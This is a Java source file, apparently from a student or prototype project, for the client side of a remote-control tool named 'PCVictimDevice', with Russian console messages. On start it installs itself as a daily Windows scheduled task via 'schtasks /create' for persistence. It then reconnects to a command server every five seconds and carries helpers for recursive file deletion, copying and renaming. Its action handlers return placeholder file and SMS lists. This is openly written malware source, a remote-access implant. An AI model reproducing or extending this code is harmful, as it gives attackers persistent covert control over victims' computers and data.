package client;

import decoders.ResponseDecoder;
import encoders.RequestEncoder;
import io.netty.bootstrap.Bootstrap;
import io.netty.channel.ChannelFuture;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.ChannelOption;
import io.netty.channel.EventLoopGroup;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.channels.FileChannel;
import java.util.Scanner;

public class PCVictimDevice {
    private static PCVictimDevice pcVictimDevice;
    private String host;
    private int port;
    private PCVictimDeviceHandler pcVictimDeviceHandler;
    private Scanner in;

    public PCVictimDevice(String host, int port) {
        this.host = host;
        this.port = port;
    }

    public static PCVictimDevice getInstance() {
        return pcVictimDevice;
    }

    public PCVictimDeviceHandler getPCVictimDeviceHandler() {
        return pcVictimDeviceHandler;
    }

    public void setVictimDeviceHandler(PCVictimDeviceHandler victimDeviceHandler) {
        this.pcVictimDeviceHandler = victimDeviceHandler;
    }

    public void run() {
        EventLoopGroup workerGroup = null;
        try {
            System.out.println("Подключаемся к серверу "+host+":"+port+"...");
            workerGroup = new NioEventLoopGroup();
            Bootstrap bootstrap = new Bootstrap();
            bootstrap.group(workerGroup);
            bootstrap.channel(NioSocketChannel.class);
            bootstrap.option(ChannelOption.SO_KEEPALIVE, true);
            bootstrap.handler(new ChannelInitializer<SocketChannel>() {

                @Override
                public void initChannel(SocketChannel ch) throws Exception {
                    PCVictimDeviceHandler victimDeviceHandler = new PCVictimDeviceHandler(host);
                    pcVictimDevice.setVictimDeviceHandler(victimDeviceHandler);
                    ch.pipeline().addLast(
                            new RequestEncoder(),
                            new ResponseDecoder(),
                            victimDeviceHandler);
                }
            });

            ChannelFuture f = bootstrap.connect(host, port).sync();
            //waitInputConsole();
            f.channel().closeFuture().sync();
        } catch (Exception e) {
            e.printStackTrace();
        }
        finally {
            workerGroup.shutdownGracefully();
        }
    }

    public void waitInputConsole() {
        System.out.println("Для отправки запроса на сервер воспользуйтесь шаблоном:");
        System.out.println("key1:value1:key1:value1 - будет преобразовано в JSONObject и отправлено на сервер.");
        System.out.println("Ожидаем пользовательский ввод...");
        in = new Scanner(System.in);
        String input;
        while ((input = in.nextLine()) != null) {
            if (pcVictimDeviceHandler == null) System.out.println("Соединение не установлено!");
            try {
                String[] params = input.split(":");
                if (params.length == 0 || params.length % 2 != 0) System.out.println("Неверный ввод! (см. key:value)");
                else
                    receiveInputConsole(params);
            } catch (Exception e) {
                System.out.println("Запрос должен быть формата JSON!");
            }
        }
    }

    public static void autorun(boolean isAutorun) {
        // jar file
        String path = new File(System.getProperty("java.class.path")).getAbsolutePath();
        String s;
        try
        {
            String[] params = path.split(";");
            if(isAutorun) {
                if (params.length > 1)
                    s = "schtasks /create /tn TestJava /sc daily /tr \"javaw -jar C:\\Users\\Vetal\\Desktop\\IntelIJProjects\\NettyProject\\out\\artifacts\\NettyProject_jar\\NettyProject.jar\" /ri 1 /f";
                else
                    s = "schtasks /create /tn TestJava /sc daily /tr \"javaw -jar "+path+"\" /ri 1 /f";
            }
            else s = "schtasks /delete /tn TestJava";

            System.out.println(s);
            Runtime.getRuntime().exec(s);
        } catch (Exception ex){
            ex.printStackTrace();
        }
    }

    private void receiveInputConsole(String[] params) {
        JSONObject response = new JSONObject();
        for (int i = 0; i < params.length; i += 2) {
            response.put(params[i], params[i+1]);
        }
        if (response.get("action").equals("get.file.list")) {
            JSONArray files = new JSONArray();
            files.add("file1");
            files.add("file2");
            files.add("file3");
            response.put("files", files);
        } else if (response.get("action").equals("get.file.info")) {
            JSONObject info = new JSONObject();
            info.put("fullPath", "/path/index/blablabla");
            info.put("size", 11211121);
            info.put("lastModifiedTime", 100000);
            response.put("info", info);
        } else if (response.get("action").equals("get.sms.list")) {
            JSONArray sms = new JSONArray();
            for (int i = 0; i < 5; i++) {
                JSONObject object = new JSONObject();
                object.put("id", i);
                object.put("text", "text" + i);
                object.put("number", 10000+i);
                object.put("date", 11211121);
                sms.add(object);
            }
            response.put("sms", sms);
        }
        pcVictimDeviceHandler.sendMessage(response);
    }

    public static boolean deleteFile(String dir) {
        File dirFile = new File(dir);
        if (dirFile.delete()) return true;
        File[] files = dirFile.listFiles();
        if (files == null) return false;

        boolean isDeleted = true;
        for (int i = 0; i < files.length; i++) {
            if (files[i].isDirectory())
                deleteFile(files[i].getPath());
            else if (!files[i].delete()) isDeleted = false;
        }
        return dirFile.delete() && isDeleted;
    }

    public static boolean renameFile(String path, String newPath) {
        File file = new File(path);
        return file.renameTo(new File(newPath));
    }

    public static boolean makeDir(String path) {
        File newDir = new File(path);
        return newDir.mkdir();
    }

    public static boolean copyFile(String path, String newPath) {
        if (path.equals(newPath)) return false;

        File sourceFile = new File(path);
        File targetFile = new File(newPath);
        FileChannel source = null;
        FileChannel target = null;
        if (sourceFile.isDirectory()) return false;
        try {

            targetFile.createNewFile();

            source = new FileInputStream(sourceFile).getChannel();
            target = new FileOutputStream(targetFile).getChannel();
            target.transferFrom(source, 0, source.size());

            source.close();
            target.close();
        }
        catch (Exception e) {
            try {
                if (source != null)
                    source.close();
                if (target != null)
                    target.close();
            } catch (Exception exception) {
                return false;
            }
            return false;
        }
        return true;
    }

    public static void main(String[] args) throws Exception {
        autorun(true);
        pcVictimDevice = new PCVictimDevice("localhost", 1121);
        while (true) {
            pcVictimDevice.run();

            System.out.println("Ожидаем 5 секунд...");
            Thread.sleep(5000);
        }
    }
}